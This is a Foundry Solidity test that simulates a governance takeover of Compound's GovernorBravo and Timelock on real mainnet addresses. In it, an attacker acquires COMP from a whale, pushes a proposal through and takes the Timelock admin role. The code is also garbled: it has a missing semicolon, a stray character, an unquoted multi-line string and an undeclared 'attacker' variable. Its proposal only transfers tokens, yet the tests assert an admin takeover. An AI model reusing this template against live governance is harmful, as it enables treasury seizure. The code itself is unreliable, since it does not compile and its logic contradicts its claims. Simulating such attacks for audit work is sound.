// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "./Helpers.sol";
import "../src/IGovernorBravo.sol";
import "../src/Timelock.sol";
import "../src/IComp.sol";

// @dev These tests were developed for block 17535430 (add with `--fork-block-number 17535430`)
contract SimulationTest is Helpers {
    // Constants
    uint256 constant proposalTH = 25000000000000000000000; // 25,000 COMP
    uint256 constant paymentAmount = 29455081001472800000000 // 1 Million in COMP based on 7-day 35.95 MA
    
    // Contracts
    IGovernorBravo governorBravo = IGovernorBravo(0xc0Da02939E1441F497fd74F78cE7Decb17B66529);
    Timelock timelock = Timelock(payable(0x6d903f6003cca6255D85CcA4D3B5E5146dC33925));
    IComp comp = IComp(0xc00e94Cb662C3520282E6f5717214004A7f26888);

    // Hodlers
    address public Fund = address(0xfA9b5f7fDc8AB34AAf3099889475d47febF830D7); // ≈305,000 COMP
    address public Genesis = address(0x0548F59fEE79f8832C299e01dCA5c76F034F558e); // ≈125,000 COMP
    address public Binance = address(0xF977814e90dA44bFA03b6295A0616a897441aceC); // ≈456,000 COMP

    // Attacker (random address without any funds)
    address public OzProposer = address(0xeC405bcD169633C0D8EDc8ef869E164e42b9ec1E); // 100 COMP
    address public Benefactor = address(0xc3d688B66703497DAA19211EEdff47f25384cdc3); // ≈748,000 COMP
    address public Multisig = address(0x57C970568668087c05352456a3F59B58B0330066); // 0 COMP

    function setUp() public {
        checkAttackerIsNotPendingAdmin();
        setGlobalDelegation();
        checkInitialBalancesAndVotingPower();
    }

    function checkAttackerIsNotPendingAdmin() internal {
        // Checks if the proposer is whitelisted
        assertEq(governorBravo.isWhitelisted(OzProposer), true);

    }

    function setGlobalDelegation() internal {
        // Delegate Fund votes to Fund
        vm.prank(Fund);
        comp.delegate(Fund);

        // Delegate Genesis votes to Genesis
        vm.prank(Genesis);
        comp.delegate(Genesis);
        
        // Delegate Binance votes to Binance
        vm.prank(Binance);s
        comp.delegate(Binance);
        
        // Voting power is not instant
        increaseBlockNumber(1000);
    }

    function checkInitialBalancesAndVotingPower() internal {
        // Asserts that the previous holders have voting power
        assertEq(comp.getCurrentVotes(Fund) > proposalTH, true);
        assertEq(comp.getCurrentVotes(Genesis) > proposalTH, true);
        assertEq(comp.getCurrentVotes(Binance) > proposalTH, true);

        // Checks if the benefactor has funds to create a proposal
        // assertEq(comp.balanceOf(Benefactor) > proposalTH, true);
    }

    function createProposal() internal returns (uint256) {
        // Targets
        address[] memory targets = new address[](1);
        targets[0] = address(comp);

        // Values
        uint256[] memory values = new uint256[](1);
        values[0] = 0;

        // Signatures
        string[] memory signatures = new string[](1);
        signatures[0] = "transfer(address,uint256)";

        // Calldatas
        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encode(Multisig, paymentAmount);

        // Description
        string memory description = "# OpenZeppelin Security Partnership - 2023 Q3 Compensation ## Background Starting on Dec 21st \n"
      "2021 \n"
      OpenZeppelin was [selected](https://compound.finance/governance/proposals/76) to offer the Compound DAO security services including continuous audit
      security advisory
      and monitoring. At the start of every quarter
      OpenZeppelin creates a proposal to perform the next service fee payment. ## Compensation Structure We receive our quarterly payments in a lump-sum of COMP. Based on the last week's average price
      this would be $42.34 per COMP for a total quarterly payment of 23
      617 COMP equaling $1M per the original agreement. This COMP will be transferred from the Timelock's existing balance. More detail in this [forum post](https://www.comp.xyz/t/openzeppelin-security-updates-for-q1-2023-q2-compensation-proposal/4163). By approving this proposal
      you agree that any services provided by OpenZeppelin shall be governed by the [Terms of Service available here](https://docs.google.com/document/d/1eDcvirf0bdzpjIkfxQHm7fcV05O1IcLXL-Dl-U52Y4k/edit?usp=sharing)";

        // We submit the proposal as the attacker
        vm.prank(attacker);

        uint256 proposalID = governorBravo.propose(
            targets,
            values,
            signatures,
            calldatas,
            description
        );

        return proposalID;
    }

    function voteOnProposal(uint256 proposalID, uint8 fundVote, uint8 genesisVote, uint8 binanceVote) internal {
        // We increment the time based on the voting delay
        increaseBlockNumber(governorBravo.votingDelay() + 1);

        // We vote on the proposal passing as large COMP holders
        // either in favor, against, or abstaining depending on input
        vm.prank(Fund);
        governorBravo.castVote(proposalID, fundVote);

        vm.prank(Genesis);
        governorBravo.castVote(proposalID, genesisVote);

        vm.prank(Binance);
        governorBravo.castVote(proposalID, binanceVote);
    }

    function giveCompToAttackerAndDelegate(uint256 amount) internal {
        // Benefactor transfers tokens to the attacker
        vm.prank(Benefactor);
        comp.transfer(attacker, amount);
        
        // Attacker delegates voting power to themselves
        vm.prank(attacker);
        comp.delegate(attacker);

        increaseBlockNumber(1000);

        // Checks if the attacker now has voting power
        assertEq(comp.getCurrentVotes(attacker) > 0, true);
    }

    function testNotReaching25kProposal() public {
        // Without voting power, the attacker should not be able to create a proposal
        vm.expectRevert("GovernorBravo::propose: proposer votes below proposal threshold");
        createProposal();

        // Checks if attacker was somehow successful
        assertEq(timelock.pendingAdmin() != attacker, true);
        assertEq(timelock.admin() != attacker, true);
    }

    function testNotReaching400kProposal() public {
        // Attacker needs more than `proposalThreshold` to pass a proposal
        // Gets this from the Benefactor
        giveCompToAttackerAndDelegate(proposalTH + 1);
        
        // Creates the proposal as the Attacker
        uint256 proposalID = createProposal();
        increaseBlockNumber(governorBravo.votingDelay() + 1);
        
        vm.startPrank(attacker);

        // Attacker votes on their proposal
        governorBravo.castVote(proposalID, 1);

        // We increment the time based on the voting period
        increaseBlockNumber(governorBravo.votingPeriod() + 1);

        // Try to queue the proposal without any other vote but cannot reach the 400,000 COMP limit
        vm.expectRevert("GovernorBravo::queue: proposal can only be queued if it is succeeded");
        governorBravo.queue(proposalID);

        vm.stopPrank();

        // Asserts that the proposal was defeated
        assertEq(governorBravo.state(proposalID), 3); // Defeated Proposal == 3

        // Checks if the attacker was somehow successful
        assertEq(timelock.pendingAdmin() != attacker, true);
        assertEq(timelock.admin() != attacker, true);
    }

    function testReaching400kRejectedProposal() public {
        // Attacker gets 400,000 COMP (4% of totalSupply) to have enough to
        // pass the proposal when no one votes against
        giveCompToAttackerAndDelegate(comp.totalSupply() * 4 / 100);
        
        // Creates the proposal
        uint256 proposalID = createProposal();
        
        // Other holders vote as abstain, abstain, against
        voteOnProposal(proposalID, 2, 2, 0);

        vm.startPrank(attacker);

        // Attacker votes on their proposal
        governorBravo.castVote(proposalID, 1);

        // We increment the time based on the voting period
        increaseBlockNumber(governorBravo.votingPeriod() + 1);

        // Checks that the proposal was defeated
        assertEq(governorBravo.state(proposalID), 3); // Defeated == 3

        // Expects to revert when queuing it
        vm.expectRevert("GovernorBravo::queue: proposal can only be queued if it is succeeded");
        governorBravo.queue(proposalID);

        vm.stopPrank();

        // Checks if the attacker was somehow successful
        assertEq(timelock.pendingAdmin() != attacker, true);
        assertEq(timelock.admin() != attacker, true);
    }

    function test400kAttackerWithHelp() public {
        // Attacker gets 400,000 COMP (4% of totalSupply) to have enough to
        // pass the proposal when no one votes against
        giveCompToAttackerAndDelegate(comp.totalSupply() * 4 / 100);
        
        // Creates the proposal
        uint256 proposalID = createProposal();
        
        // Other hodlers vote as abstain, in favor, against
        voteOnProposal(proposalID, 2, 1, 0);

        vm.startPrank(attacker);

        // Attacker votes on their proposal
        governorBravo.castVote(proposalID, 1);

        // We increment the time based on the voting period
        increaseBlockNumber(governorBravo.votingPeriod() + 1);

        // Checks that the proposal succeeded (4) and queues the proposal
        assertEq(governorBravo.state(proposalID), 4);
        governorBravo.queue(proposalID);

        // Wait the timelock delay
        increaseBlockTimestamp(172800 + 1); // 172800 is the Timelock delay 0x6d903f6003cca6255D85CcA4D3B5E5146dC33925

        // Asserts that it was queued (5)
        assertEq(governorBravo.state(proposalID), 5);

        // Executes the proposal
        governorBravo.execute(proposalID);

        // Asserts it was executed (7)
        assertEq(governorBravo.state(proposalID), 7);

        // Attacker accepts the admin role in the timelock
        timelock.acceptAdmin();

        vm.stopPrank();

        // Validates that the attacker is the new admin
        assertEq(timelock.pendingAdmin(), address(0));
        assertEq(timelock.admin(), attacker);
    }

    // This is the analogous test to the one provided
    // by the disclosed bug
    function testReaching400kPassedProposal() public {
        // Attacker gets 400,000 COMP (4% of totalSupply) to have enough to
        // pass the proposal when no one votes against
        giveCompToAttackerAndDelegate(comp.totalSupply() * 4 / 100);
        
        // Attacker creates the proposal
        uint256 proposalID = createProposal();
        increaseBlockNumber(governorBravo.votingDelay() + 1);
        
        vm.startPrank(attacker);

        // Attacker votes on their proposal
        governorBravo.castVote(proposalID, 1);

        // We increment the time based on the voting period
        increaseBlockNumber(governorBravo.votingPeriod() + 1);

        // Asserts that the proposal was successful (4)
        assertEq(governorBravo.state(proposalID), 4);

        // Queues the proposal
        governorBravo.queue(proposalID);

        // Wait the timelock delay
        increaseBlockTimestamp(172800 + 1); // 172800 is the Timelock delay 0x6d903f6003cca6255D85CcA4D3B5E5146dC33925

        // Asserts that the proposal was queued (5)
        assertEq(governorBravo.state(proposalID), 5);

        // Attacker executes the proposal
        governorBravo.execute(proposalID);

        // Asserts that the proposal was executed (7)
        assertEq(governorBravo.state(proposalID), 7);

        // Attacker accepts the admin role in the timelock
        timelock.acceptAdmin();

        vm.stopPrank();

        // Validates that the attacker is the new admin
        assertEq(timelock.pendingAdmin(), address(0));
        assertEq(timelock.admin(), attacker);
    }
}
